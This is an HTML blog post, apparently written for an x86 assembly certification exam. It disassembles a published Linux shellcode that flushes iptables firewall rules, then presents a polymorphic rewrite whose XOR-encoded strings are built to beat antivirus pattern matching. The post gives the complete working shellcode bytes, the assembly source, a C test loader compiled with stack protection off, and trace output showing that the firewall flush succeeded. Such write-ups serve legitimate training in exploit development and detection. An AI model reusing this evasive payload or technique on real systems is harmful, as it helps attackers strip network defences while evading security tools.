@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html>
+  <!-- Inspired by https://secret.club/ and https://github.com/clayh53/tufte-jekyll -->
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>SLAE x86 Exam - Assignment #6 Part 3</title>
+    <meta name="description" content="DisclaimerThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:https://www.pentesteracadem...">
+
+    <link rel="stylesheet" type="text/css" href="/assets/css/fonts.min.css">
+    <link rel="canonical" href="/22/01/04/slae32-assignment-6_3">
+    <link rel="alternate" type="application/rss+xml" title="rbct" href="/feed.xml" />
+
+    <style>
+         * { margin: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 1rem; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 1rem; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "JetBrains Mono",monospace; text-rendering: geometricPrecision; -moz-osx-font-smoothing: grayscale; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono { font-family: 'JetBrains Mono', monospace; font-weight: 500; } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: 1rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #1d2021; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { font-size: 1rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 1rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.725; margin-bottom: 1rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 1.5rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; margin-right: 10px } h3:before { content: "##"; } h1 { font-size: 1.3em; } h3 { font-size: 1.3em; } p a, main li a { text-decoration: underline; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em 0 0; padding-left: 20px; border-left: 4px solid #444 } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { padding-left: 5px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { color: #fe8019; background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } p > code { font-size: 0.925rem; } @media screen and (min-width: 640px) { pre > code { font-size: 1rem; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } p:has(aside) { border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1) }} @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer.tags { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); } div.epigraph footer { text-align: right; margin-bottom: 2rem;} section.pagination { padding-bottom: 1rem; } img + em { display: block; text-align: center; } table { border: 1px solid; padding: 10px; margin-bottom: 10px } td { padding: 2px 10px; } div.highlighter-rouge, code.language-text { background-color: var(--bg-1); padding: 15px 10px 10px 10px; margin-bottom: 10px } sub { font-size: 0.875rem }
+    </style>
+</head>
+
+  <body>
+    <!--- Header and nav template site-wide -->
+<header>
+    <a href="/">RBCT</a>
+
+    <nav class="group">
+        
+            
+        
+            
+                
+                <a href="/">POSTS</a>
+                
+            
+        
+            
+                
+                <a href="/about/">ABOUT</a>
+                
+            
+        
+    </nav>
+</header>
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <h1>SLAE x86 Exam - Assignment #6 Part 3</h1>
+
+        <div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px">
+            <img itemprop="image" alt="rbct" src="/assets/author_profile_img/rbct.png">
+            <span class="mono authors">
+                <a href="/author/rbct" itemprop="name">rbct</a>
+            </span>
+        </div>
+
+        <time class="mono" datetime="2022-01-04T00:00:00+01:00" itemProp="datePublished">
+            4 January 2022
+        </time>
+
+        <hr>
+        <main itemprop="articleBody" style="position: relative;">
+            <h2 id="disclaimer">Disclaimer</h2>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p>
+<p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p>
+<p>Student ID: PA-30398</p>
+<h2 id="foreword">Foreword</h2>
+<p>The 6th assignment requires you to analyze 3 shellcodes from <a href="http://shell-storm.org/shellcode/">Shell-Storm</a> and &quot;create polymorphic versions of them to beat pattern matching&quot;.</p>
+<p>There's only 1 constraint:</p>
+<blockquote>
+<p>The polymorphic versions cannot be larger 150% of the existing shellcode</p>
+</blockquote>
+<p>I chose the following shellcodes:</p>
+<ol>
+<li><a href="http://shell-storm.org/shellcode/files/shellcode-812.php">Linux/x86 - chmod 666 /etc/passwd &amp; /etc/shadow - 57 bytes</a></li>
+<li><a href="http://shell-storm.org/shellcode/files/shellcode-222.php">Linux/x86 - setuid(0) setgid(0) execve(echo 0 &gt; /proc/sys/kernel/randomize_va_space) - 79 bytes</a></li>
+<li><a href="http://shell-storm.org/shellcode/files/shellcode-825.php">Linux/x86 - iptables --flush - 43 bytes</a></li>
+</ol>
+<p>In this part I'll create a polymorphic version of the 3rd shellcode.</p>
+<h2 id="source-code">Source code</h2>
+<p>The files for this part of the assignment are the following:</p>
+<ul>
+<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/original_shellcode.nasm">original_shellcode.nasm</a>, the original shellcode taken from Shell-Storm</li>
+<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/polymorphic_shellcode.nasm">polymorphic_shellcode.nasm</a>, my polymorphic version of the shellcode above</li>
+<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/test_polymorphic_shellcode.nasm">test_polymorphic_shellcode.nasm</a>, a <code>C</code> program for testing the polymorphic shellcode</li>
+</ul>
+<h2 id="analysis">Analysis</h2>
+<p>First, we need to analyse the original shellcode:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span> <span class="o">&gt;</span> shellcode.bin
+
+ndisasm <span class="nt">-b</span> 32 <span class="nt">-p</span> intel shellcode.bin
+</code></pre></div></div>
+<p>Follows the output of <code>ndisasm</code>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; clear EAX, setting it to 0x00000000</span>
+<span class="err">00000000</span>  <span class="err">31</span><span class="nf">C0</span>              <span class="nv">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
+
+                            <span class="c1">; null terminator for the string below</span>
+<span class="err">00000002</span>  <span class="err">50</span>                <span class="nf">push</span> <span class="nb">eax</span>
+
+                            <span class="c1">; string -F</span>
+<span class="err">00000003</span>  <span class="err">66682</span><span class="nf">D46</span>          <span class="nv">push</span> <span class="kt">word</span> <span class="mh">0x462d</span>
+
+                            <span class="c1">; save the pointer to the string into ESI</span>
+<span class="err">00000007</span>  <span class="err">89</span><span class="nf">E6</span>              <span class="nv">mov</span> <span class="nb">esi</span><span class="p">,</span><span class="nb">esp</span>
+
+                            <span class="c1">; NULL terminator for the string below</span>
+<span class="err">00000009</span>  <span class="err">50</span>                <span class="nf">push</span> <span class="nb">eax</span>
+
+                            <span class="c1">; string ///sbin/iptables</span>
+<span class="err">0000000</span><span class="nf">A</span>  <span class="mi">68626</span><span class="nv">C6573</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x73656c62</span>
+<span class="err">0000000</span><span class="nf">F</span>  <span class="mi">6869707461</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x61747069</span>
+<span class="err">00000014</span>  <span class="err">6862696</span><span class="nf">E2F</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x2f6e6962</span>
+<span class="err">00000019</span>  <span class="err">682</span><span class="nf">F2F2F73</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x732f2f2f</span>
+
+                            <span class="c1">; save the pointer to the string into EBX</span>
+<span class="err">0000001</span><span class="nf">E</span>  <span class="mi">89</span><span class="nv">E3</span>              <span class="nv">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esp</span>
+
+                            <span class="c1">; array of pointers to command-line arguments:</span>
+                            <span class="c1">;   - ebx -&gt; pointer to string '///sbin/iptables'</span>
+                            <span class="c1">;   - esi -&gt; pointer to string '-F'</span>
+                            <span class="c1">;   - eax -&gt; 0x00000000 (null terminator of the array)</span>
+<span class="err">00000020</span>  <span class="err">50</span>                <span class="nf">push</span> <span class="nb">eax</span>
+<span class="err">00000021</span>  <span class="err">56</span>                <span class="nf">push</span> <span class="nb">esi</span>
+<span class="err">00000022</span>  <span class="err">53</span>                <span class="nf">push</span> <span class="nb">ebx</span>
+</code></pre></div></div>
+<p>So far, the author of this shellcode pushed the string <code>///sbin/iptables</code> to the stack, saving its pointer into the register <code>EBX</code>, which is going be used by <code>execve</code> as the <strong>1st argument</strong> of iptables.</p>
+<p>Follows the function prototype of <code>execve</code>:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">execve</span><span class="p">(</span>
+  <span class="c1">// executable to run</span>
+  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span>
+
+  <span class="c1">// array of command-line arguments</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[],</span>
+
+  <span class="c1">// array of environment variables</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[]</span>
+<span class="p">);</span>
+</code></pre></div></div>
+<p>In this case <code>EBX</code> is <code>pathname</code>, i.e. a pointer to a string indicating the executable to run. While <code>ECX</code> is a pointer to an array of pointers, terminated by the DWORD <code>0x00000000</code>. On the stack, it would look like this:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; *ebx -&gt; '///sbin/iptables'</span>
+<span class="c1">; *esi -&gt; '-F'</span>
+<span class="c1">; 0x00000000</span>
+</code></pre></div></div>
+<p>Follows the rest of the disassembly:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; 2nd argument of execve:</span>
+                            <span class="c1">;   pointer to array of pointers to strings acting as</span>
+                            <span class="c1">;   command-line arguments of the program</span>
+<span class="err">00000023</span>  <span class="err">89</span><span class="nf">E1</span>              <span class="nv">mov</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>
+
+                            <span class="c1">; 3rd argument of execve:</span>
+                            <span class="c1">;   pointer to array of pointers to env. variables</span>
+<span class="err">00000025</span>  <span class="err">89</span><span class="nf">C2</span>              <span class="nv">mov</span> <span class="nb">edx</span><span class="p">,</span><span class="nb">eax</span>
+
+                            <span class="c1">; call execve syscall</span>
+<span class="err">00000027</span>  <span class="nf">B00B</span>              <span class="nv">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0xb</span>
+<span class="err">00000029</span>  <span class="nf">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+<p>These instructions use <code>execve</code> to run the command <code>///sbin/iptables -F</code>.</p>
+<h2 id="polymorphic-shellcode">Polymorphic shellcode</h2>
+<p>Follows the polymorphic version of the shellcode:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; Title: Linux/x86 - iptables --flush</span>
+<span class="c1">; Author: Robert C. Raducioiu</span>
+<span class="c1">; Web: rbct.it</span>
+<span class="c1">; Reference: http://shell-storm.org/shellcode/files/shellcode-825.php</span>
+<span class="c1">; Shellcode: "\x31\xdb\xf7\xe3\x52\x66\xbf\x2d\x46\x66\x57\x89\xe7\x52\xbe\x74\x63\x62\x72\x52\x68\x62\x6c\x65\x73\x68\x1d\x13\x16\x13\x31\x34\x24\x68\x62\x69\x6e\x2f\x68\x5b\x4c\x4d\x01\x31\x34\x24\x89\xe3\x52\x57\x53\xb0\x0a\x40\x54\x59\xcd\x80"</span>
+<span class="c1">; Length: 58 bytes</span>
+
+<span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nl">_start:</span>
+
+    <span class="c1">; clear EBX, EAX, and EDX</span>
+    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
+    <span class="nf">mul</span> <span class="nb">ebx</span>
+    
+    <span class="c1">; instead of pushing EAX, push EDX</span>
+    <span class="nf">push</span> <span class="nb">edx</span>
+
+    <span class="c1">; push word 0x462d</span>
+    <span class="c1">; instead of pushing the WORD 0x462d, use two steps</span>
+    <span class="nf">mov</span> <span class="nb">di</span><span class="p">,</span> <span class="mh">0x462d</span>
+    <span class="nf">push</span> <span class="nb">di</span>
+
+    <span class="c1">; use edi instead of esi</span>
+    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span><span class="nb">esp</span>
+    
+    <span class="c1">; use EBX or EDX instead of EAX</span>
+    <span class="nf">push</span> <span class="nb">edx</span>
+
+    <span class="c1">; XOR key ('rbct')</span>
+    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="mh">0x72626374</span>
+
+    <span class="c1">; NULL DWORD acting as the string terminator for</span>
+    <span class="c1">;   the path of the executable</span>
+    <span class="nf">push</span> <span class="nb">edx</span>
+
+    <span class="nf">push</span> <span class="mh">0x73656c62</span>
+    
+    <span class="nf">push</span> <span class="mh">0x1316131d</span>
+    <span class="nf">xor</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="nb">esi</span>
+
+    <span class="nf">push</span> <span class="mh">0x2f6e6962</span>
+
+    <span class="nf">push</span> <span class="mh">0x014d4c5b</span>
+    <span class="nf">xor</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="nb">esi</span>
+
+    <span class="c1">; save the pointer to the string into EBX</span>
+    <span class="nf">push</span> <span class="nb">esp</span>
+    <span class="nf">pop</span> <span class="nb">ebx</span>
+
+    <span class="c1">; instead of 'push eax' use 'push edx', as they are both set to 0x0 </span>
+    <span class="nf">push</span> <span class="nb">edx</span>
+
+    <span class="nf">push</span> <span class="nb">edi</span>
+    <span class="nf">push</span> <span class="nb">ebx</span>
+
+    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xa</span>
+    <span class="nf">inc</span> <span class="nb">eax</span>
+
+    <span class="c1">; use the PUSH-POP technique instead of the MOV instruction</span>
+    <span class="nf">push</span> <span class="nb">esp</span>
+    <span class="nf">pop</span> <span class="nb">ecx</span>
+
+    <span class="c1">; call execve</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+<p>Now let me describe the changes. First, I've changed the following instructions:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nl">_start:</span>
+
+    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
+    <span class="nf">push</span> <span class="nb">eax</span>
+    <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x462d</span>
+    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span><span class="nb">esp</span>
+    <span class="nf">push</span> <span class="nb">eax</span>
+</code></pre></div></div>
+<p>Into this:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nl">_start:</span>
+
+    <span class="c1">; clear EBX, EAX, and EDX</span>
+    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
+    <span class="nf">mul</span> <span class="nb">ebx</span>
+    
+    <span class="c1">; instead of pushing EAX, push EDX</span>
+    <span class="nf">push</span> <span class="nb">edx</span>
+
+    <span class="c1">; push word 0x462d</span>
+    <span class="c1">; instead of pushing the WORD 0x462d, use two steps</span>
+    <span class="nf">mov</span> <span class="nb">di</span><span class="p">,</span> <span class="mh">0x462d</span>
+    <span class="nf">push</span> <span class="nb">di</span>
+</code></pre></div></div>
+<p>Starting from the beginning, instead of clearing only the register <code>EAX</code>, I'm also clearing <code>EBX</code> and <code>EDX</code>. Moreover, instead of using the instruction <code>push eax</code>, I'm using <code>push edx</code> in order to change the byte of the instruction.</p>
+<p>Next, instead of using the instruction <code>push 0x462d</code> I chose a two-steps approach, at the cost of adding more bytes to the shellcode.</p>
+<p>In particular, I chose to use the <code>MOV</code> instruction to copy the WORD <code>0x462d</code> into the 16-bits <code>DI</code> register, and after that push it to the stack.</p>
+<p>After that:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">; use edi instead of esi</span>
+    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">esp</span>
+  
+    <span class="c1">; use EBX or EDX instead of EAX</span>
+    <span class="nf">push</span> <span class="nb">edx</span>
+</code></pre></div></div>
+<p>Instead of saving the pointer to the string <code>-F</code> into the register <code>ESI</code>, I'm using the register <code>EDI</code>, thus changing the bytes of the shellcode.</p>
+<p>Next, I chose to use <code>push edx</code> instead of <code>push eax</code>, as both these registers are cleared, thus set to <code>0x00000000</code>.</p>
+<p>Follows the next piece of assembly code to analyse:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">; XOR key ('rbct')</span>
+    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="mh">0x72626374</span>
+
+    <span class="c1">; NULL DWORD acting as the string terminator for</span>
+    <span class="c1">;   the path of the executable</span>
+    <span class="nf">push</span> <span class="nb">edx</span>
+
+    <span class="nf">push</span> <span class="mh">0x73656c62</span>
+    
+    <span class="nf">push</span> <span class="mh">0x1316131d</span>
+    <span class="nf">xor</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="nb">esi</span>
+
+    <span class="nf">push</span> <span class="mh">0x2f6e6962</span>
+
+    <span class="nf">push</span> <span class="mh">0x014d4c5b</span>
+    <span class="nf">xor</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="nb">esi</span>
+</code></pre></div></div>
+<p>This one differs the most in my opinion, and it's also the reason behind the increment of <code>11 bytes</code> compared to the original shellcode.</p>
+<p>Given the path of the executable is pushed to the stack in clear-text, an <code>AntiVirus</code> product could easily find it, and therefore flag the shellcode as malicious.</p>
+<p>Therefore, I decided to make a compromise and XOR two of the most obvious DWORDs:</p>
+<ul>
+<li><code>0x61747069</code> -&gt; &quot;ipta&quot;</li>
+<li><code>0x732f2f2f</code> -&gt; &quot;///s&quot;</li>
+</ul>
+<p>One could also XOR the other two DWORDs, based on how many bytes you can add to the shellcode. In this case, the XOR key is the DWORD <code>0x72626374</code> (string: <code>rbct</code>).</p>
+<p>Follows the second-to-last piece of Assembly code:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">; save the pointer to the string into EBX</span>
+    <span class="nf">push</span> <span class="nb">esp</span>
+    <span class="nf">pop</span> <span class="nb">ebx</span>
+
+    <span class="c1">; instead of 'push eax' use 'push edx', as they are both set to 0x0 </span>
+    <span class="nf">push</span> <span class="nb">edx</span>
+
+    <span class="nf">push</span> <span class="nb">edi</span>
+    <span class="nf">push</span> <span class="nb">ebx</span>
+</code></pre></div></div>
+<p>Starting from the top, I used the <code>PUSH-POP</code> technique, instead of the instruction <code>mov ebx, esp</code>, as it changes the resulting bytes, while using the same numer of bytes.</p>
+<p>Next, I've repeated what I've already done before: use <code>push edx</code> instead of <code>push eax</code>, because they are both set to <code>0x00000000</code>.</p>
+<p>The instructions <code>push edi</code> and <code>push ebx</code> aren't too different from the original shellcode, I had to use the register <code>edi</code> because I've changed it previously, storing the pointer to the string <code>-F</code> into <code>EDI</code> instead of <code>ESI</code>.</p>
+<p>Finally, it's time to analyse the last piece of Assembly code:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xa</span>
+    <span class="nf">inc</span> <span class="nb">eax</span>
+
+    <span class="c1">; use the PUSH-POP technique instead 'mov ecx, esp'</span>
+    <span class="nf">push</span> <span class="nb">esp</span>
+    <span class="nf">pop</span> <span class="nb">ecx</span>
+
+    <span class="c1">; call execve</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+<p>At the end of the original shellcode there's the instruction <code>mov al, 0xb</code>. I chose to split it into two instructions (<code>mov al, 0xa</code> and <code>inc eax</code>), as it adds only one byte more compared to the original shellcode.</p>
+<p>I also changed the position inside the shellcode: instead of placing the instructions at the end, I placed them before other instructions, in order to evade pattern matching.</p>
+<p>Next, I replaced the instruction <code>mov ecx,esp</code> with two instructions, using the <code>PUSH-POP</code> technique.</p>
+<p>Compared to the original shellcode, I didn't have to clear EDX, as it was already cleared from the start (by means of <code>mul ebx</code>).</p>
+<p>The last instruction is identical to the one from the original shellcode.</p>
+<h3 id="testing">Testing</h3>
+<p>To test the polymorphic shellcode, I've used the following C program:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="s">"</span><span class="se">\x31\xdb\xf7\xe3\x52\x66\xbf\x2d\x46\x66\x57\x89\xe7\x52\xbe\x74\x63\x62\x72\x52\x68\x62\x6c\x65\x73\x68\x1d\x13\x16\x13\x31\x34\x24\x68\x62\x69\x6e\x2f\x68\x5b\x4c\x4d\x01\x31\x34\x24\x54\x5b\x52\x57\x53\xb0\x0a\x40\x54\x59\xcd\x80</span><span class="s">"</span><span class="p">;</span>
+
+<span class="n">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode length: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>
+
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">;</span>
+    <span class="n">ret</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>To compile:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-fno-stack-protector</span> <span class="nt">-z</span> execstack <span class="nt">-o</span> test_polymorphic_shellcode test_polymorphic_shellcode.c
+</code></pre></div></div>
+<p>Once I've run it, I could confirm it executes <code>iptables -F</code> successfully:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rbct@slae:~/exam/assignment_6/3<span class="nv">$ </span><span class="nb">sudo </span>strace <span class="nt">-e</span> <span class="nv">trace</span><span class="o">=</span>execve ./test_polymorphic_shellcode 
+<span class="c"># execve("./test_polymorphic_shellcode", ["./test_polymorphic_shellcode"], [/* 16 vars */]) = 0</span>
+<span class="c"># Shellcode length: 58</span>
+<span class="c"># execve("///sbin/iptables", ["///sbin/iptables", "-F"], [/* 0 vars */]) = 0</span>
+
+rbct@slae:~/exam/assignment_6/3<span class="err">$</span>
+</code></pre></div></div>
+<p>As you can see, it confirms the length of the shellcode is <code>58 bytes</code>. More important is the last <code>execve</code> syscall. It executed the command <code>///sbin/iptables -F</code> and returned <code>0</code>, meaning it succeeded.</p>
+
+
+            <footer class="tags">
+                <section class="mono tags">
+                    Tagged
+
+                    
+                    <a href="/tags#/tags/slae/">slae</a>, <a href="/tags#/tags/assembly/">assembly</a>, <a href="/tags#/tags/nasm/">nasm</a>, <a href="/tags#/tags/c/">c</a>, <a href="/tags#/tags/exam/">exam</a>, <a href="/tags#/tags/shellcode/">shellcode</a>, <a href="/tags#/tags/polymorphism/">polymorphism</a>, <a href="/tags#/tags/x86/">x86</a>
+                </section><section class="pagination">
+                        <a href="/22/01/12/slae32-assignment-7">
+                            <div class="mono">NEXT</div>
+                            SLAE x86 Exam - Assignment #7
+                        </a>
+                    </section><section class="pagination">
+                        <a href="/22/01/04/slae32-assignment-6_2">
+                            <div class="mono">PREVIOUS</div>
+                            SLAE x86 Exam - Assignment #6 Part 2
+                        </a>
